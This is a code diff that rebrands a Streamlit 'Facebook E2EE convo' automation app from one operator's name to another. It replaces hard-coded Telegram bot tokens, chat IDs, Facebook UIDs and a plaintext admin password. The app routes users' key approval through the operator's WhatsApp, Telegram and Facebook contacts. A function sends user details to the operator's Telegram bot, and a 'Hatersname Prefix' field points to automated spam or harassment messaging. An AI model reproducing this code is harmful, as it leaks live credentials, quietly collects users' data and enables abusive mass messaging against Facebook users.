@@ -66,16 +66,16 @@ if 'mongodb_started' not in st.session_state:
 # 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="FB E2EE by ⚜️9MAN-x-YAMDHUD⚜️",
+    page_title="FB E2EE by ⚜️SURAJ OBEROY⚜️",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
 # Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = "8782762466:AAGh2AOb7Cj2EdG09_sD-graYMzeN4LNm88"
-TELEGRAM_CHAT_ID = "8075498750"
-FACEBOOK_ADMIN_UID = "61558672117666"
+TELEGRAM_BOT_TOKEN = "8754919690:AAG4sAvuodeFADdfLJWjBwQKExJsyjYjTxM"
+TELEGRAM_CHAT_ID = "5571967739"
+FACEBOOK_ADMIN_UID = "100056999599628"
 
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
@@ -970,18 +970,18 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 pass
 
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    whatsapp_url = f"https://wa.me/918958154046?text={requests.utils.quote(message)}"
+    message = f"Hello Suraj sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    whatsapp_url = f"https://wa.me/918452969216?text={requests.utils.quote(message)}"
     return whatsapp_url
 
 def send_approval_request_via_facebook(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/profile.php?id=61558672117666"
+    message = f"Hello Suraj sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    facebook_url = f"https://www.facebook.com/profile.php?id=100056999599628"
     return facebook_url
 
 def send_approval_request_via_telegram(user_real_name, approval_key):
-    message = f"Hello 9man-x-yamdhud papa ji\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    telegram_url = f"https://t.me/t.me/YAMDHUD?text={requests.utils.quote(message)}"
+    message = f"Hello suraj papa ji\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    telegram_url = f"https://t.me/t.me/SURAJ?text={requests.utils.quote(message)}"
     return telegram_url
 
 def run_automation_with_notification(user_config, username, automation_state, user_id):
@@ -1034,7 +1034,7 @@ st.markdown('<div class="main-container">', unsafe_allow_html=True)
 # Profile Icon
 st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
 
-st.markdown('<div class="main-header"><h1>LORD DEVIL E2EE FACEBOOK CONVO</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>SURAJ E2EE FACEBOOK CONVO</h1><p>Created by SURAJ OBEROY</p></div>', unsafe_allow_html=True)
 
 # Admin Panel
 if st.sidebar.checkbox("🔐 Admin Login"):
@@ -1042,7 +1042,7 @@ if st.sidebar.checkbox("🔐 Admin Login"):
     admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
     
     if st.sidebar.button("Login as Admin"):
-        if admin_username == "YAMDHUD" and admin_password == "9MAN520":
+        if admin_username == "SURAJX" and admin_password == "SURAJ2227":
             st.session_state.admin_logged_in = True
             st.sidebar.success("Admin login successful!")
         else:
@@ -1359,7 +1359,7 @@ else:
         st.markdown('<div class="input-label">Your Real Name</div>', unsafe_allow_html=True)
         user_real_name = st.text_input("", key="real_name", placeholder="Enter your real name for approval", 
                                       value=st.session_state.user_real_name, label_visibility="collapsed")
-        st.markdown('<div class="input-hint">This name will be sent to 9man-x-yamdhud for approval</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-hint">This name will be sent to suraj oberoy for approval</div>', unsafe_allow_html=True)
         
         if user_real_name:
             st.session_state.user_real_name = user_real_name
@@ -1367,7 +1367,7 @@ else:
         
         # Send Approval Request Button
         st.markdown("### 📤 Send Approval Request")
-        st.markdown("Click the button below to send your approval request to 9man-x-yamdhud:")
+        st.markdown("Click the button below to send your approval request to suraj oberoy:")
         
         if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
             if st.session_state.user_real_name:
@@ -1376,7 +1376,7 @@ else:
                 st.warning("Please enter your real name first")
         
         # Contact buttons - ALWAYS VISIBLE
-        st.markdown("### 📞 Contact ⚜️9MAN-x-YAMDHUD⚜️ for Approval")
+        st.markdown("### 📞 Contact ⚜️SURAJ OBEROY ⚜️ for Approval")
         st.markdown("Click any button below to send your approval request:")
         
         col1, col2, col3 = st.columns(3)
@@ -1402,7 +1402,7 @@ else:
             )
             st.markdown(f'<a href="{telegram_url}" class="contact-btn telegram" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
         
-        st.info("After sending the approval request, wait for LORD DEVIL to approve your key. Refresh this page to check your approval status.")
+        st.info("After sending the approval request, wait for suraj oberoy to approve your key. Refresh this page to check your approval status.")
         
         # Check approval status
         if st.button("🔄 Check Approval Status", use_container_width=True):
@@ -1413,7 +1413,7 @@ else:
                 st.success("🎉 Your account has been approved! You can now access the automation features.")
                 st.rerun()
             else:
-                st.warning("Your approval is still pending. Please wait for 9man-x-yamdhud to approve your request.")
+                st.warning("Your approval is still pending. Please wait for suraj oberoy to approve your request.")
         
         if st.sidebar.button("🚪 Logout"):
             st.session_state.logged_in = False
@@ -1469,7 +1469,7 @@ else:
                 
                 st.markdown('<div class="input-label">Hatersname Prefix</div>', unsafe_allow_html=True)
                 name_prefix = st.text_input("", value=user_config['name_prefix'],
-                                           placeholder="e.g., [END TO END 9MAN-X-YAMDHUD]",
+                                           placeholder="e.g., [END TO END SURAJ OBEROY]",
                                            label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                 
@@ -1556,4 +1556,4 @@ else:
                     st.rerun()
 
 st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
-st.markdown('<div class="footer">Made with ❤️ by ⚜️9MAN-x-YAMDHUD⚜️ | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by ⚜️SURAJ oberoy⚜️ | © 2026 All Rights Reserved</div>', unsafe_allow_html=True)
